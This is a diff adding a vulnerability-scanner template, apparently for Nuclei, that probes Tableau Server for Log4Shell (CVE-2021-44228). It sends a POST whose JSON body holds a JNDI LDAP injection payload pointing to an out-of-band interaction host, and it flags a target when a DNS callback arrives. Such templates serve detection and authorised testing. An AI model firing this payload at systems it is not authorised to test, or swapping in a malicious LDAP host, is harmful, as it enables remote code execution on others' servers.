@@ -1,0 +1,37 @@
+id: tableau-log4j-rce
+
+info:
+  name: tableau-log4j-rce
+  author: j3ssie
+  reference:
+    - https://github.com/rwincey/CVE-2021-44228-Log4j-Payloads
+  severity: critical
+  tags: log4j,oast
+
+requests:
+  - raw:
+      - |
+        POST /vizportal/api/web/v1/getSessionInfo HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 109
+        Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="100", "Google Chrome";v="100"
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json;charset=UTF-8
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4766.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: en-US,en;q=0.9
+        Connection: close
+
+        {"method":"${jndi:ldap://{{interactsh-url}}/aa} ","params":{}}
+    # matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms DNS Interaction
+        words:
+          - "dns"
+
+      # - type: word
+      #   part: body
+      #   words:
+      #     - '{"result":{"errors":[{"code":25}]}}'
